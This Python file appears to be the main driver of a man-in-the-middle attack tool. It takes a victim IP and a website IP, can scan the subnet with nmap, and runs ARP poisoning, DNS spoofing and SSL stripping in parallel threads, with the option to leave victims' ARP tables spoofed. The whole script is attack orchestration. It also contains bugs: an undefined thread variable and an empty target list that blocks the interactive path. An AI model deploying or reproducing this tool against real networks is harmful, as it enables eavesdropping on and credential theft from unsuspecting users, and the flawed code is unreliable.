from arp_poisoning import ARPPoison
from dns_spoofing import DNSSpoof
from dns_learner import DNSLearner
from ssl_stripping import SSLStrip
from silent_discovery import Silent

import argparse
import scapy.all as scapy
import logging
import threading
import time
import nmap

def parse_args():
    parser = argparse.ArgumentParser(
        description="Automated MITM attack tool with ARP poisoning, DNS spoofing and SSL stripping capabilities",
        add_help=True
    )

    parser.add_argument(
        "-i", "--interactive",
        action="store_true",
        help="Interactive mode"
    )

    default_interface = scapy.conf.iface
    parser.add_argument(
        "-e", "--interface",
        default=default_interface,
        help=f"Network interface (default: {default_interface})"
    )

    parser.add_argument(
        "-t", "--target",
        help="Victim IP address"
    )

    parser.add_argument(
        "-w", "--website",
        help="Website IP address"
    )

    parser.add_argument(
        "-a", "--aggressiveness",
        type=int,
        default=5,
        help="Aggressiveness level (1-10, default: 5)"
    )

    args = parser.parse_args()

    if not 1 <= args.aggressiveness <= 10:
        parser.error("Aggressiveness must be between 1 and 10")

    if not args.interactive:
        missing = []
        if not args.target:
            missing.append("-t/--target")
        if not args.website:
            missing.append("-w/--website")

        if missing:
            parser.error(f"! Missing required arguments: {', '.join(missing)} (or use -i)")

    return args

def setup():
    args = parse_args()

    if args.interactive:
        try:
            ifaces = scapy.get_if_list()
            print(f"Available interfaces: {ifaces}")
            args.interface = input("> Choose an interface: ").strip()
            while args.interface not in ifaces:
                print(f"! Invalid interface. Please choose an interface from the following list: {ifaces}")
                args.interface = input("> Choose an interface: ").strip()

            probe = input("> Probe subnet for available targets? [y/n] ").strip().lower()
            if probe == "y" or probe == "yes":
                nm = nmap.PortScanner()
                nm.scan(f"{scapy.get_if_addr(args.interface)}/24", arguments="-sP")
                print(f"Detected targets: {nm.all_hosts()}")
                targets = nm.all_hosts()
            else:
                targets = []
                stop_silent = threading.Event()
                silent = Silent(args.interface)
                silent_thread = threading.Thread(
                    target=silent.discover,
                    args=(stop_silent,)
                )
                silent_thread.start()

            while True:
                check = input("Detecting hosts silently. Type 'done' to continue.").strip().lower()
                if check == 'done':
                    if silent_thread.is_alive():
                        stop_silent.set()
                        silent_thread.join()
                    break

            args.target = input("> Input the victim IP address: ").strip()
            while args.target not in targets:
                print(f"! Invalid IP. Please choose an IP from the following list: {targets}")
                args.target = input("> Input the victim IP address: ").strip()

            args.website = input("> Input the website IP address: ").strip()
            while args.website not in targets:
                print(f"! Invalid IP. Please choose an IP from the following list: {targets}")
                args.website = input("> Input the website IP address: ").strip()

            args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
            while not 1 <= args.aggressiveness <= 10:
                print("! Invalid number. Aggressiveness must be between 1 and 10")
                args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
        except KeyboardInterrupt:
            print("\nAborted. Exiting...")
            if silent_thread.is_alive():
                stop_silent.set()
                silent_thread.join()
            exit(0)

    return (
        args.interface,
        args.target,
        args.website,
        args.aggressiveness
    )

def run(iface, victim, site, timer):
    stop_event = threading.Event()

    # Poison ARP in a separate thread (to maintain MitM position)
    arp = ARPPoison(iface, victim, site)
    arp_thread = threading.Thread(
        target=arp.attack,
        args=(timer, stop_event,)
    )

    # Learn DNS in a separate thread
    dns_learner = DNSLearner(iface, arp)
    dns_learn_thread = threading.Thread(
        target=dns_learner.start,
        args=(stop_event,)
    )

    # Spoof DNS in a separate thread
    dns_spoofer = DNSSpoof(iface, victim)
    dns_sniff_thread = threading.Thread(
        target=dns_spoofer.start,
        args=(stop_event,)
    )

    # Strip SSL in a separate thread
    ssl_stripper = SSLStrip(iface, victim, site)
    ssl_thread = threading.Thread(
        target=ssl_stripper.start,
        args=(stop_event,)
    )

    arp_thread.start()
    dns_learn_thread.start()
    dns_sniff_thread.start()
    ssl_thread.start()

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        # Program should stop on CTRL+C
        stop_event.set()
        print("\nAttack is being cancelled. Please wait...")

        arp_thread.join()
        dns_learn_thread.join()
        dns_sniff_thread.join()
        ssl_thread.join()

        dns_spoofer.disable_dns_block()

        restore = input("Restore ARP tables? [y/n] ").strip().lower()
        if restore == "y" or restore == "yes":
            arp.restore_tables(arp.victimIP, arp.websiteIP, arp.victimMAC, arp.websiteMAC)
            if arp.dnsIP:
                arp.restore_tables(arp.victimIP, arp.dnsIP, arp.victimMAC, arp.dnsMAC)
            print("ARP tables were restored. Exiting...")
        else:
            print("ARP tables left spoofed. Exiting...")

        exit(0)

if __name__ == "__main__":
    scapy.conf.verb = 0
    logging.getLogger("scapy").setLevel(logging.ERROR)

    iface, victim, site, timer = setup()
    run(iface, victim, site, timer)
